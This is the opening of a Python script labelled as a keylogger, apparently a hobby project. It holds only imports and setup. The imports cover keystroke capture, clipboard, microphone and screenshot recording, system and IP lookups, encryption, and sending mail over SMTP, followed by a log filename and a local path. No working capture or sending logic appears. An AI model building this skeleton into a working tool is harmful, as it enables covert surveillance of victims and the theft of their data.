# Libraries 

from email.mime.multipart import MIMEMultipart      
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Libs to collect  computer information
import socket
import platform

# clipboard libs
import pyperclip  # Replaced win32clipboard

# keystrokes lib
from pynput.keyboard import Key, Listener

# system info to track time
import time
import os

# microphone libs
from scipy.io.wavfile import write
import sounddevice as sd

# encrypt files lib
from cryptography.fernet import Fernet

import getpass
from requests import get 

# screenshot lib 
from multiprocessing import Process, freeze_support
import mss          # Replaced by ImageGrab 


## KeyLogger

keys_information = "key_log.txt"

file_path = "/home/vblueice/Documents/VSCode/project"
extend = "/"

